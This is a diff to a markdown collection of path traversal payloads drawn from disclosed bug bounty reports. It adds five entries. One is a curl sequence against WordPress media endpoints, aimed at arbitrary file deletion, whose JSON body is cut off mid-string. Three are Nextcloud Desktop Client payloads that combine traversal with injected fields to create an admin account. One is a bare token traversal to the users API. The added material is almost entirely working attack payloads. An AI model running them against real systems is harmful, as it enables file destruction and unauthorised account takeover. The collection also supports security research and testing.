@@ -1,6 +1,6 @@
 # Path Traversal
 
-186 payloads from disclosed reports.
+191 payloads from disclosed reports.
 
 ## Directory traversal using '..' in URL path and query parameter to read /sessions
 
@@ -1152,6 +1152,28 @@ DiagramBlock <|-- PlantUmlBlock
 — [Kroki Arbitrary File Read/Write ](https://hackerone.com/reports/1098793) · GitLab · [ledz1996](https://hackerone.com/ledz1996)
 
 
+## Arbitrary file write via WordPress media sub_sizes JSON 'file' field injection
+
+### `7680439f`
+
+```
+AP=<author1 application password>
+B=http://localhost:8356
+
+# [1] Author uploads a real JPEG
+curl -u "author1:$AP" -H "Content-Disposition: attachment; filename=zap4.jpg" \
+     -H "Content-Type: image/jpeg" --data-binary @zap.jpg \
+     -X POST "$B/?rest_route=/wp/v2/media"                       # 201, id=8
+
+# [2] Poison one sub-size filename with the name of the file to destroy
+curl -u "author1:$AP" -X POST -H "Content-Type: application/json" \
+  -d '{"sub_sizes":[{"image_size":"thumbnail","fil
+```
+
+**Parameter:** `file`
+— [Author → arbitrary file deletion anywhere on disk (site takeover) via `POST /wp/v2/media/<id>/finalize` poisoning `_wp_attachment_metadata`](https://hackerone.com/reports/3931777) · WordPress · [jakubk](https://hackerone.com/jakubk)
+
+
 ## Command injection creating symlink to /etc/passwd for path traversal
 
 ### `a9ca77c6`
@@ -1198,6 +1220,18 @@ root:*:0:0:System Administrator:/var/root:/bin/sh
 ```
 
 — [\[angular-http-server\] Server Directory Traversal](https://hackerone.com/reports/330349) · Node.js third-party modules · [tungpun](https://hackerone.com/tungpun)
+
+
+## Directory traversal using backslashes and '..' in the 'path' parameter
+
+### `47cfc12a`
+
+```
+path=/.\&userid=hacker&password=h4ck3rPassw0Rd!&displayName=hacker&email=mail@example.com&groups[]=admin&\..\.owncloudsync.log
+```
+
+**Parameter:** `path`
+— [CSRF vulnerability in Nextcloud Desktop Client 3.6.1 on Windows when clicking malicious link ](https://hackerone.com/reports/1741430) · Nextcloud · [lukasreschke](https://hackerone.com/lukasreschke)
 
 
 ## Directory traversal using ../ to escape /tmp directory
@@ -1953,6 +1987,18 @@ GET /help/../../../Gemfile
 — [Directory traversal attack in view resolver](https://hackerone.com/reports/3370) · Ruby on Rails · [lautis](https://hackerone.com/lautis)
 
 
+## Path traversal via the 'relPath' POST body parameter using backslashes and '..'
+
+### `10e87c2c`
+
+```
+.\&userid=hacker&password=h4ck3rPassw0Rd!&displayName=hacker&email=mail@example.com&groups[]=admin&\..\.owncloudsync.log
+```
+
+**Parameter:** `relPath`
+— [CSRF vulnerability in Nextcloud Desktop Client 3.6.1 on Windows when clicking malicious link ](https://hackerone.com/reports/1741430) · Nextcloud · [lukasreschke](https://hackerone.com/lukasreschke)
+
+
 ## Path traversal using ".." segments in the URL path
 
 ### `53ef51f2`
@@ -2020,6 +2066,30 @@ irb(main):029:0> Tempfile.open(["\\..\\..\\..\\..\\..\\Users\\rootx\\malicious",
 ```
 
 — [\[CVE-2019-11510 \] Path Traversal on ████████ leads to leaked passwords, RCE, etc](https://hackerone.com/reports/671857) · U.S. Dept Of Defense · [cdl](https://hackerone.com/cdl)
+
+
+## Path traversal via the 'token' parameter to reach ocs/v1.php/cloud/users
+
+### `735339ef`
+
+```
+nc://open/admin@pentest.cloud.wtf/.\&userid=hacker&password=h4ck3rPassw0Rd!&displayName=hacker&email=mail@example.com&groups[]=admin&\..\.owncloudsync.log?token=../../../../../../../ocs/v1.php/cloud/users
+```
+
+**Parameter:** `token`
+— [CSRF vulnerability in Nextcloud Desktop Client 3.6.1 on Windows when clicking malicious link ](https://hackerone.com/reports/1741430) · Nextcloud · [lukasreschke](https://hackerone.com/lukasreschke)
+
+
+## Path traversal using '../../..' in the 'token' query parameter
+
+### `97ab7a45`
+
+```
+?token=../../../../../../../ocs/v1.php/cloud/users
+```
+
+**Parameter:** `token`
+— [CSRF vulnerability in Nextcloud Desktop Client 3.6.1 on Windows when clicking malicious link ](https://hackerone.com/reports/1741430) · Nextcloud · [lukasreschke](https://hackerone.com/lukasreschke)
 
 
 ## Path traversal to trigger a redirect, injected via the account_id property in a JSON token
